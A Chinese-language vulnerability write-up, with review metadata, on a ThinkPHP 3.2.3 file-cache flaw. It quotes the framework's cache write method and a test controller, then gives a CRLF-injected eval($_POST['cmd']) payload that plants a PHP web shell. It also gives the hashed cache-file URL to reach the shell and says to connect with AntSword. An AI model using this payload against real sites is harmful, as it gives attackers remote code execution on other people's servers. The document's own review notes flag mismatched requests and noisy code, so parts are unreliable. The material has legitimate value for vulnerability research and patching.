---
source: "hatch 补库批 20260928"
product: "ThinkPHP / PHP文件缓存"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Thinkphp 3.2.3 缓存漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：示例3.2.3；需缓存内容可控、未压缩、PHP缓存文件web可达可执行和可猜路径"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-eb6bb939a3e2caccff326c5b"
entity_id: "ve-eb6bb939a3e2caccff326c5b"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：示例3.2.3；需缓存内容可控、未压缩、PHP缓存文件web可达可执行和可猜路径

代码与实验材料：完整set源码及自定义POST a3控制器，CRLF跳出注释，图片证据未视检

来源证据范围：有h3art3ars原稿

- **结论使用边界（1）**：总结请求与实验控制器不对应；依据：实验index读取POST a3，总结却GET /get?id，未提供该方法。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（2）**：关键条件缺失；依据：set中有gzcompress分支，未说明需禁用；也未限制webroot可达与PHP解析。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **实验改动边界（3）**：代码格式严重噪声；依据：PHP作为列表项穿插{=html}空注释围栏。以下步骤按原实验条件保留；人工改动后的行为只支持该修改环境，不用于证明未修改发行版默认可利用。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Thinkphp 3.2.3 缓存漏洞

一、漏洞简介
------------

二、漏洞影响
------------

Thinkphp 3.2.3

三、复现过程
------------

### 漏洞分析

-   直接跟进到`/Library/Think/Cache/File.class.php`文件，看到set方法：

<!-- -->

-   /**
             * 写入缓存
             * @access public
             * @param string $name 缓存变量名
             * @param mixed $value  存储数据
             * @param int $expire  有效时间 0为永久
             * @return boolean
             */
            public function set($name,$value,$expire=null) {
                N('cache_write',1);
                if(is_null($expire)) {
                    $expire =  $this->options['expire'];
                }
                $filename   =   $this->filename($name);
                $data   =   serialize($value);
                if( C('DATA_CACHE_COMPRESS') && function_exists('gzcompress')) {
                    //数据压缩
                    $data   =   gzcompress($data,3);
                }
                if(C('DATA_CACHE_CHECK')) {//开启数据校验
                    $check  =  md5($data);
                }else {
                    $check  =  '';
                }
                $data    = "<?php\n//".sprintf('%012d',$expire).$check.$data."\n?>";
                //data参数经过序列化，直接被写到文件内。

                $result  =   file_put_contents($filename,$data);
                if($result) {
                    if($this->options['length']>0) {
                        // 记录缓存队列
                        $this->queue($name);
                    }
                    clearstatcache();
                    return true;
                }else {
                    return false;
                }
            }

<!-- -->

-   写一个调用缓存函数的的方法，运行一下。看看写进去什么

<!-- -->

-   <?php
        namespace Home\Controller;
        use Think\Controller;
        class IndexController extends Controller {

            public function index(){
                $a=I('post.a3');
                S('name',$a);
            }
        }

<!-- -->

-   在set方法下断点，访问
    `http://www.0-sec.org/index.php/Home/Index/index.html`
    ，post数据：`a3=aaaa`

![](./.resource/Thinkphp3.2.3缓存漏洞/media/rId25.png)

可以看到\$data参数经过序列化，直接写入php后缀的文件。F9运行可以看到，在`Application/Runtime/Temp/`文件夹下生成了php文件。

![](./.resource/Thinkphp3.2.3缓存漏洞/media/rId26.png)

-   写入到文件被行注释了。

-   `$data`参数未过滤`%0d%0a`可以用换行来绕过行注释，尝试post数据：

<!-- -->

-   `a3=%0d%0aeval($_POST['cmd']);%0d%0a//`

![](./.resource/Thinkphp3.2.3缓存漏洞/media/rId27.png)

-   之后用蚁剑连接成功

![](./.resource/Thinkphp3.2.3缓存漏洞/media/rId28.png)

### 总结

### Thinkphp3.2.3

1.  漏洞文件位置(一般审计得出)

-   `http://www.0-sec.org/index.php/Home/Index/get?id=%0d%0aeval($_POST['cmd']);%0d%0a//`

2.  缓存文件为缓存名的md5值，这里采用md5（name）=b068931cc450442b63f5b3d276ea4297

-   `http://www.0-sec.org/Application/Runtime/Temp/b068931cc450442b63f5b3d276ea4297.php`

3.  之后蚁剑连接。

参考链接
--------

> [https://h3art3ars.github.io/2019/12/16/Thinkphp3-2-3-5-0-10%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/](https://h3art3ars.github.io/2019/12/16/Thinkphp3-2-3-5-0-10缓存漏洞/)
